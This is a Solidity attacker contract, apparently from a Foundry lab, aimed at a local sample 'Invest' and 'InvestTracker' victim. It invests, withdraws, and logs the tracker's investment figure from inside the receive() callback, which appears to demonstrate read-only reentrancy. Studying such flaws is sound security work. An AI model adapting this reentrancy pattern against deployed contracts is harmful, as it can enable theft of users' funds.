// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Victim.sol";
import "forge-std/console.sol";

contract InvestTrackerAttacker {
    Invest invest;
    InvestTracker tracker;

    constructor(address _tracker, address payable _invest) {
        invest = Invest(payable(_invest));
        tracker = InvestTracker(_tracker);
    }

    function Attack() public payable {
        invest.invest{value: msg.value}();
        invest.withdraw(msg.value);
    }

    receive() external payable {
        uint256 investment = tracker.checkInvestment(address(this));
        console.log("%s:%d", "Investment is", investment);
    }
}
